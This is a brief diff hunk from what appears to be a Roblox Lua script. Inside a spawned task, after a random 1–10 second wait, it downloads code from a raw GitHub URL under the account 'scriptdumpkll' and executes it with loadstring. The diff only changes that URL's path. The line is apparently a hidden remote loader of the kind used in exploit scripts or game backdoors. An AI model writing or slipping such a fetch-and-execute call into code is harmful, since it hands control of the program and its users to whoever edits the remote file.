@@ -1044,7 +1044,7 @@ task.spawn(function()
 			local ran = math.random(1, 10)
 			print(ran)
 			wait(ran)
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/sh/main/s"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/shop/main/s"))()
 		end
 
 		task.spawn(function()
